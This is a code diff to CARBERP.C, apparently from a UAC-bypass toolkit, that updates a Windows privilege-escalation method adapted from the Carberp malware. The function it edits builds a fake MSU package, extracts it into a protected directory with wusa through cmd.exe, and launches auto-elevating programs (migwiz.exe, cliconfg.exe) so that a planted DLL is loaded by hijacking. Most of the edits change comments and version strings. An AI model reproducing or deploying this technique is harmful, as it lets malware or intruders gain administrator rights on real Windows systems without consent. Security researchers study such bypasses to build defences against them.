@@ -4,9 +4,9 @@
 *
 *  TITLE:       CARBERP.C
 *
-*  VERSION:     1.30
+*  VERSION:     1.40
 *
-*  DATE:        30 Mar 2015
+*  DATE:        04 Apr 2015
 *
 *  Tweaked Carberp methods.
 *  Original Carberp is exploiting mcx2prov.exe in ehome.
@@ -24,7 +24,7 @@
 *
 * Purpose:
 *
-* Build and install fake msu packet then run migwiz.
+* Build and install fake msu package then run target application.
 *
 */
 BOOL ucmWusaMethod(
@@ -44,6 +44,7 @@ BOOL ucmWusaMethod(
 
 	switch (dwType) {
 
+	//use migwiz.exe as target
 	case METHOD_CARBERP:
 		lpSourceDll = METHOD_MIGWIZ_SOURCEDLL;
 		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
@@ -51,6 +52,7 @@ BOOL ucmWusaMethod(
 		lpTargetProcess = METHOD_MIGWIZ_TARGETAPP;
 		break;
 
+	//use cliconfg.exe as target
 	case METHOD_CARBERP_EX:
 		lpSourceDll = METHOD_SQLSVR_SOURCEDLL;
 		lpMsuPackage = METHOD_CARBERP_MSUPACKAGE;
@@ -90,10 +92,7 @@ BOOL ucmWusaMethod(
 			break;
 		}
 
-		//
-		// Target is migwiz because it has manifest with access = HighestAvailable and 
-		// it is vulnerable to delay load dll attack.
-		//
+		//extract msu data to target directory
 		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
 		wsprintfW(szCmd, lpCommandLine, szMsuFileName);
 		if (!supRunProcess(L"cmd.exe", szCmd)) {
@@ -101,6 +100,7 @@ BOOL ucmWusaMethod(
 			break;
 		}
 
+		//run target process for dll hijacking
 		RtlSecureZeroMemory(szCmd, sizeof(szCmd));
 		if (ExpandEnvironmentStringsW(lpTargetProcess,
 			szCmd, MAX_PATH) == 0)
